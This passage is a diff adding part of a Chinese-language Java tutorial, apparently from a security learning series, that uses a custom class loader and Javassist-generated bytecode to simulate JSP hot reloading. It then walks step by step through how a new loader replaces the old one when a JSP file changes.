+			jspClassLoader = new JSPClassLoader(parent);
+			jspClassLoader.createClass(className, bytes);
+
+			// 缓存JSP文件和所使用的类加载器
+			this.jspClassLoaderMap.put(jspFile, jspClassLoader);
+			return jspClassLoader;
+		}
+
+		return null;
+	}
+
+	/**
+	 * 使用动态的类加载器调用test_jsp#_jspService方法
+	 *
+	 * @param jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在
+	 * @param className 类名
+	 * @param bytes     类字节码
+	 * @param parent    JSP的父类加载
+	 */
+	public void invokeJSPServiceMethod(File jspFile, String className, byte[] bytes, ClassLoader parent) {
+		JSPClassLoader jspClassLoader = getJSPFileClassLoader(jspFile, className, bytes, parent);
+
+		try {
+			// 加载com.anbai.sec.classloader.test_jsp类
+			Class<?> jspClass = jspClassLoader.loadClass(className);
+
+			// 创建test_jsp类实例
+			Object jspInstance = jspClass.newInstance();
+
+			// 获取test_jsp#_jspService方法
+			Method jspServiceMethod = jspClass.getMethod("_jspService");
+
+			// 调用_jspService方法
+			jspServiceMethod.invoke(jspInstance);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
+
+	public static void main(String[] args) throws Exception {
+		TestJSPClassLoader test = new TestJSPClassLoader();
+
+		String      className   = "com.anbai.sec.classloader.test_jsp";
+		File        jspFile     = new File("/data/test.jsp");
+		ClassLoader classLoader = ClassLoader.getSystemClassLoader();
+
+		// 模拟第一次访问test.jsp文件自动生成test_jsp.java
+		byte[] testJSPClass01 = createTestJSPClass(className, "Hello...");
+
+		test.invokeJSPServiceMethod(jspFile, className, testJSPClass01, classLoader);
+
+		// 模拟修改了test.jsp文件，热加载修改后的test_jsp.class
+		byte[] testJSPClass02 = createTestJSPClass(className, "World...");
+		test.invokeJSPServiceMethod(jspFile, className, testJSPClass02, classLoader);
+	}
+
+	/**
+	 * JSP类加载器
+	 */
+	static class JSPClassLoader extends ClassLoader {
+
+		public JSPClassLoader(ClassLoader parent) {
+			super(parent);
+		}
+
+		/**
+		 * 创建类
+		 *
+		 * @param className 类名
+		 * @param bytes     类字节码
+		 */
+		public void createClass(String className, byte[] bytes) {
+			defineClass(className, bytes, 0, bytes.length);
+		}
+
+	}
+
+}
+```
+
+该示例程序通过Javassist动态生成了两个不同的`com.anbai.sec.classloader.test_jsp`类字节码，模拟JSP文件修改后的类加载，核心原理就是**检测到JSP文件修改后动态替换类加载器**，从而实现JSP热加载，具体的处理逻辑如下（第3和第4部未实现，使用了Javassist动态创建类字节码模拟）：
+
+1. 模拟客户端第一次访问test.jsp；
+2. 检测是否已缓存了test.jsp的类加载；
+3. ~~Servlet容器找到test.jsp文件并编译成test_jsp.java~~；
+4. ~~编译成test_jsp.class文件~~；
+5. 创建test.jsp文件专用的类加载器`jspClassLoader`，并缓存到`jspClassLoaderMap`对象中；
+6. `jspClassLoader`加载test_jsp.class字节码并创建`com.anbai.sec.classloader.test_jsp`类；
+7. `jspClassLoader`调用`com.anbai.sec.classloader.test_jsp`类的`_jspService`方法；
+8. 输出`Hello...`；
+9. 模拟客户端第二次访问test.jsp；
+10. 假设test.jsp文件发生了修改，重新编译test.jsp并创建一个新的类加载器`jspClassLoader`加载新的类字节码；
+11. 使用新创建的`jspClassLoader`类加载器调用`com.anbai.sec.classloader.test_jsp`类的`_jspService`方法；
+12. 输出`World...`；
 
 
 
